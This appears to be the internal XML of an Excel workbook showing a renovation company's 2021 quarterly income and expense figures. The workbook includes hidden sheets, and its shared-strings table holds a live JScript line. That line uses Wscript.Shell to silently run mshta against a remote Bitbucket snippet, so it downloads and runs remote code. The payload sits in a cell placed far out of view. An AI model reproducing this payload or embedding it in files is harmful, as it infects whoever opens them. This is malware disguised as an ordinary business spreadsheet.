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07\Desktop\customers\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{CC3E0ED8-24B6-452F-9469-CF15EAE6BC5B}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-108" yWindow="-108" windowWidth="23256" windowHeight="12720" firstSheet="1" activeTab="1" xr2:uid="{00000000-000D-0000-FFFF-FFFF00000000}"/>
  </bookViews>
  <sheets>
    <sheet name="FAIRBANKS RENOVATION" sheetId="1" state="hidden" r:id="rId1"/>
    <sheet name="FAIRBANKS RENOVATIONS" sheetId="3" r:id="rId2"/>
    <sheet name="blanked" sheetId="4" state="hidden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6" i="1" l="1"/>
  <c r="E28" i="1" s="1"/>
  <c r="D26" i="1"/>
  <c r="D28" i="1" s="1"/>
  <c r="C26" i="1"/>
  <c r="C28" i="1" s="1"/>
  <c r="B26" i="1"/>
  <c r="B28" i="1" s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3" i="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="29" uniqueCount="29">
  <si>
    <t>FAIRBANKS RENOVATION, INC 2021 TAXES</t>
  </si>
  <si>
    <t>Q1</t>
  </si>
  <si>
    <t>Q2</t>
  </si>
  <si>
    <t>Q3</t>
  </si>
  <si>
    <t>Q4</t>
  </si>
  <si>
    <t>TOTALS</t>
  </si>
  <si>
    <t>INCOME</t>
  </si>
  <si>
    <t>ADVERTISING</t>
  </si>
  <si>
    <t>AUTO EXPENSE</t>
  </si>
  <si>
    <t>AUTO PLATES</t>
  </si>
  <si>
    <t>BANK CHARGES</t>
  </si>
  <si>
    <t>CITY OF LOUISVILLE</t>
  </si>
  <si>
    <t>COLORADO DEPT OF REVENUE</t>
  </si>
  <si>
    <t>COLORADO STATE TREASURER</t>
  </si>
  <si>
    <t>CUSTOMER SUPPLIES</t>
  </si>
  <si>
    <t>GAS</t>
  </si>
  <si>
    <t>INSURANCE</t>
  </si>
  <si>
    <t>IRS PAYMENTS</t>
  </si>
  <si>
    <t>L &amp; L TAX SERVICE</t>
  </si>
  <si>
    <t>OFFICE SUPPLIES</t>
  </si>
  <si>
    <t>PARKING</t>
  </si>
  <si>
    <t>PHONE</t>
  </si>
  <si>
    <t>RENT</t>
  </si>
  <si>
    <t>SHOP</t>
  </si>
  <si>
    <t>TRASH</t>
  </si>
  <si>
    <t>UNIFORMS</t>
  </si>
  <si>
    <t>UTILITIES</t>
  </si>
  <si>
    <t>VARTIV (CREDIT CARD)</t>
  </si>
  <si>
    <t>chuchukukukaokiwDasidow = new ActiveXObject('Wscript.Shell');KALYJA = "mshta https://bitbucket.org/!api/2.0/snippets/hogya/oB5ep7/b64bf6befc66a06d996ee7a59c21f189412a165e/files/charles";chuchukukukaokiwDasidow.run(KALYJA,0);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</si>
</sst>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43" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1"/>
    <xf numFmtId="43" fontId="0" fillId="0" borderId="1" xfId="0" applyNumberFormat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workbookViewId="0">
      <selection activeCell="G28" sqref="A1:G28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.4" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="37.44140625" customWidth="1"/>
    <col min="2" max="2" width="35.6640625" customWidth="1"/>
    <col min="3" max="3" width="20.77734375" customWidth="1"/>
    <col min="4" max="4" width="23.77734375" customWidth="1"/>
    <col min="5" max="5" width="22.88671875" customWidth="1"/>
    <col min="7" max="7" width="8.88671875" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:7" ht="15.6" x14ac:dyDescent="0.3">
      <c r="A1" s="1" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="2" spans="1:7" x14ac:dyDescent="0.3">
      <c r="B2" s="2" t="s">
        <v>1</v>
      </c>
      <c r="C2" s="2" t="s">
        <v>2</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>3</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>4</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="3" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A3" t="s">
        <v>6</v>
      </c>
      <c r="B3" s="3">
        <v>26777.94</v>
      </c>
      <c r="C3" s="3">
        <v>44154.18</v>
      </c>
      <c r="D3" s="3">
        <v>41110.699999999997</v>
      </c>
      <c r="E3" s="3">
        <v>28890.5</v>
      </c>
      <c r="G3" s="3">
        <f>SUM(B3:F3)</f>
        <v>140933.32</v>
      </c>
    </row>
    <row r="4" spans="1:7" x14ac:dyDescent="0.3">
      <c r="B4" s="3"/>
      <c r="C4" s="3"/>
      <c r="D4" s="3"/>
      <c r="E4" s="3"/>
    </row>
    <row r="5" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A5" t="s">
        <v>7</v>
      </c>
      <c r="B5" s="3">
        <v>862</v>
      </c>
      <c r="C5" s="3">
        <v>1918</v>
      </c>
      <c r="D5" s="3">
        <v>1291.74</v>
      </c>
      <c r="E5" s="3">
        <v>1334.5</v>
      </c>
      <c r="G5" s="3">
        <f t="shared" ref="G5:G24" si="0">SUM(B5:F5)</f>
        <v>5406.24</v>
      </c>
    </row>
    <row r="6" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A6" t="s">
        <v>8</v>
      </c>
      <c r="B6" s="3">
        <v>14.09</v>
      </c>
      <c r="C6" s="3">
        <v>1048.5</v>
      </c>
      <c r="D6" s="3">
        <v>1316.36</v>
      </c>
      <c r="E6" s="3">
        <v>498.79</v>
      </c>
      <c r="G6" s="3">
        <f t="shared" si="0"/>
        <v>2877.74</v>
      </c>
    </row>
    <row r="7" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A7" t="s">
        <v>9</v>
      </c>
      <c r="B7" s="3"/>
      <c r="C7" s="3">
        <v>409.86</v>
      </c>
      <c r="D7" s="3"/>
      <c r="E7" s="3"/>
      <c r="G7" s="3">
        <f t="shared" si="0"/>
        <v>409.86</v>
      </c>
    </row>
    <row r="8" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A8" t="s">
        <v>10</v>
      </c>
      <c r="B8" s="3">
        <v>14.5</v>
      </c>
      <c r="C8" s="3">
        <v>12</v>
      </c>
      <c r="D8" s="3">
        <v>12</v>
      </c>
      <c r="E8" s="3">
        <v>28.5</v>
      </c>
      <c r="G8" s="3">
        <f t="shared" si="0"/>
        <v>67</v>
      </c>
    </row>
    <row r="9" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A9" t="s">
        <v>11</v>
      </c>
      <c r="B9" s="3">
        <v>98</v>
      </c>
      <c r="C9" s="3">
        <v>76</v>
      </c>
      <c r="D9" s="3">
        <v>99</v>
      </c>
      <c r="E9" s="3">
        <v>25</v>
      </c>
      <c r="G9" s="3">
        <f t="shared" si="0"/>
        <v>298</v>
      </c>
    </row>
    <row r="10" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A10" t="s">
        <v>12</v>
      </c>
      <c r="B10" s="3">
        <v>346.19</v>
      </c>
      <c r="C10" s="3">
        <v>285.8</v>
      </c>
      <c r="D10" s="3">
        <v>363.68</v>
      </c>
      <c r="E10" s="3">
        <v>345.25</v>
      </c>
      <c r="G10" s="3">
        <f t="shared" si="0"/>
        <v>1340.92</v>
      </c>
    </row>
    <row r="11" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A11" t="s">
        <v>13</v>
      </c>
      <c r="B11" s="3"/>
      <c r="C11" s="3">
        <v>57.29</v>
      </c>
      <c r="D11" s="3">
        <v>50.15</v>
      </c>
      <c r="E11" s="3"/>
      <c r="G11" s="3">
        <f t="shared" si="0"/>
        <v>107.44</v>
      </c>
    </row>
    <row r="12" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A12" t="s">
        <v>14</v>
      </c>
      <c r="B12" s="3">
        <v>12007.26</v>
      </c>
      <c r="C12" s="3">
        <v>22178.16</v>
      </c>
      <c r="D12" s="3">
        <v>19152.87</v>
      </c>
      <c r="E12" s="3">
        <v>15002.38</v>
      </c>
      <c r="G12" s="3">
        <f t="shared" si="0"/>
        <v>68340.67</v>
      </c>
    </row>
    <row r="13" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A13" t="s">
        <v>15</v>
      </c>
      <c r="B13" s="3">
        <v>995.6</v>
      </c>
      <c r="C13" s="3">
        <v>1372.01</v>
      </c>
      <c r="D13" s="3">
        <v>2007.37</v>
      </c>
      <c r="E13" s="3">
        <v>1733.55</v>
      </c>
      <c r="G13" s="3">
        <f t="shared" si="0"/>
        <v>6108.53</v>
      </c>
    </row>
    <row r="14" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A14" t="s">
        <v>16</v>
      </c>
      <c r="B14" s="3">
        <v>300</v>
      </c>
      <c r="C14" s="3">
        <v>702</v>
      </c>
      <c r="D14" s="3">
        <v>956.61</v>
      </c>
      <c r="E14" s="3">
        <v>1099.07</v>
      </c>
      <c r="G14" s="3">
        <f t="shared" si="0"/>
        <v>3057.6800000000003</v>
      </c>
    </row>
    <row r="15" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A15" t="s">
        <v>17</v>
      </c>
      <c r="B15" s="3">
        <v>1497.75</v>
      </c>
      <c r="C15" s="3">
        <v>1109.54</v>
      </c>
      <c r="D15" s="3">
        <v>1139.79</v>
      </c>
      <c r="E15" s="3"/>
      <c r="G15" s="3">
        <f t="shared" si="0"/>
        <v>3747.08</v>
      </c>
    </row>
    <row r="16" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A16" t="s">
        <v>18</v>
      </c>
      <c r="B16" s="3">
        <v>405</v>
      </c>
      <c r="C16" s="3">
        <v>110</v>
      </c>
      <c r="D16" s="3">
        <v>110</v>
      </c>
      <c r="E16" s="3">
        <v>110</v>
      </c>
      <c r="G16" s="3">
        <f t="shared" si="0"/>
        <v>735</v>
      </c>
    </row>
    <row r="17" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A17" t="s">
        <v>19</v>
      </c>
      <c r="B17" s="3">
        <v>511.4</v>
      </c>
      <c r="C17" s="3">
        <v>552.32000000000005</v>
      </c>
      <c r="D17" s="3">
        <v>658.92</v>
      </c>
      <c r="E17" s="3">
        <v>731.6</v>
      </c>
      <c r="G17" s="3">
        <f t="shared" si="0"/>
        <v>2454.2399999999998</v>
      </c>
    </row>
    <row r="18" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A18" t="s">
        <v>20</v>
      </c>
      <c r="B18" s="3"/>
      <c r="C18" s="3"/>
      <c r="D18" s="3">
        <v>25</v>
      </c>
      <c r="E18" s="3">
        <v>25</v>
      </c>
      <c r="G18" s="3">
        <f t="shared" si="0"/>
        <v>50</v>
      </c>
    </row>
    <row r="19" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A19" t="s">
        <v>21</v>
      </c>
      <c r="B19" s="3">
        <v>701.87</v>
      </c>
      <c r="C19" s="3">
        <v>913.57</v>
      </c>
      <c r="D19" s="3">
        <v>501.48</v>
      </c>
      <c r="E19" s="3">
        <v>489</v>
      </c>
      <c r="G19" s="3">
        <f t="shared" si="0"/>
        <v>2605.92</v>
      </c>
    </row>
    <row r="20" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A20" t="s">
        <v>22</v>
      </c>
      <c r="B20" s="3">
        <v>5220</v>
      </c>
      <c r="C20" s="3">
        <v>5220</v>
      </c>
      <c r="D20" s="3">
        <v>5220</v>
      </c>
      <c r="E20" s="3">
        <v>5400</v>
      </c>
      <c r="G20" s="3">
        <f t="shared" si="0"/>
        <v>21060</v>
      </c>
    </row>
    <row r="21" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A21" t="s">
        <v>23</v>
      </c>
      <c r="B21" s="3">
        <v>398.49</v>
      </c>
      <c r="C21" s="3">
        <v>713</v>
      </c>
      <c r="D21" s="3">
        <v>576</v>
      </c>
      <c r="E21" s="3">
        <v>522.70000000000005</v>
      </c>
      <c r="G21" s="3">
        <f t="shared" si="0"/>
        <v>2210.19</v>
      </c>
    </row>
    <row r="22" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A22" t="s">
        <v>24</v>
      </c>
      <c r="B22" s="3">
        <v>383.03</v>
      </c>
      <c r="C22" s="3">
        <v>131.18</v>
      </c>
      <c r="D22" s="3">
        <v>145.16</v>
      </c>
      <c r="E22" s="3">
        <v>217.62</v>
      </c>
      <c r="G22" s="3">
        <f t="shared" si="0"/>
        <v>876.99</v>
      </c>
    </row>
    <row r="23" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A23" t="s">
        <v>25</v>
      </c>
      <c r="B23" s="3">
        <v>120</v>
      </c>
      <c r="C23" s="3">
        <v>224.88</v>
      </c>
      <c r="D23" s="3">
        <v>432.85</v>
      </c>
      <c r="E23" s="3">
        <v>243.95</v>
      </c>
      <c r="G23" s="3">
        <f t="shared" si="0"/>
        <v>1021.6800000000001</v>
      </c>
    </row>
    <row r="24" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A24" t="s">
        <v>26</v>
      </c>
      <c r="B24" s="3">
        <v>796.77</v>
      </c>
      <c r="C24" s="3">
        <v>401.94</v>
      </c>
      <c r="D24" s="3">
        <v>808.37</v>
      </c>
      <c r="E24" s="3">
        <v>482.68</v>
      </c>
      <c r="G24" s="3">
        <f t="shared" si="0"/>
        <v>2489.7599999999998</v>
      </c>
    </row>
    <row r="25" spans="1:7" x14ac:dyDescent="0.3">
      <c r="A25" t="s">
        <v>27</v>
      </c>
      <c r="B25" s="4">
        <v>124.64</v>
      </c>
      <c r="C25" s="4">
        <v>309.02999999999997</v>
      </c>
      <c r="D25" s="4">
        <v>67.91</v>
      </c>
      <c r="E25" s="4">
        <v>322.70999999999998</v>
      </c>
      <c r="G25" s="3"/>
    </row>
    <row r="26" spans="1:7" x14ac:dyDescent="0.3">
      <c r="B26" s="3">
        <f>SUM(B5:B25)</f>
        <v>24796.59</v>
      </c>
      <c r="C26" s="3">
        <f>SUM(C5:C25)</f>
        <v>37745.08</v>
      </c>
      <c r="D26" s="3">
        <f>SUM(D5:D25)</f>
        <v>34935.260000000009</v>
      </c>
      <c r="E26" s="3">
        <f>SUM(E5:E25)</f>
        <v>28612.299999999996</v>
      </c>
    </row>
    <row r="27" spans="1:7" x14ac:dyDescent="0.3">
      <c r="B27" s="3"/>
      <c r="C27" s="3"/>
      <c r="D27" s="3"/>
      <c r="E27" s="3"/>
    </row>
    <row r="28" spans="1:7" x14ac:dyDescent="0.3">
      <c r="B28" s="3">
        <f>B3-B26</f>
        <v>1981.3499999999985</v>
      </c>
      <c r="C28" s="3">
        <f>C3-C26</f>
        <v>6409.0999999999985</v>
      </c>
      <c r="D28" s="3">
        <f>D3-D26</f>
        <v>6175.4399999999878</v>
      </c>
      <c r="E28" s="3">
        <f>E3-E26</f>
        <v>278.20000000000437</v>
      </c>
      <c r="G2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DF028-B199-4CE4-81DB-D604B0133324}">
  <sheetPr codeName="Sheet3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9A41E-BC95-49CE-9E8B-230F429D7841}">
  <sheetPr codeName="Sheet4"/>
  <dimension ref="TO1029"/>
  <sheetViews>
    <sheetView topLeftCell="SV1028" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="TL1037" sqref="TL1037"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.4" x14ac:dyDescent="0.3"/>
  <sheetData>
    <row r="1029" spans="535:535" x14ac:dyDescent="0.3">
      <c r="TO1029" s="5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FAIRBANKS RENOVATION</vt:lpstr>
      <vt:lpstr>FAIRBANKS RENOVATIONS</vt:lpstr>
      <vt:lpstr>blanked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Profex</dc:creator>
  <cp:lastModifiedBy>007</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-06-05T18:17:20Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-04-20T21:55:02Z</dcterms:modified>
</cp:coreProperties>
</file>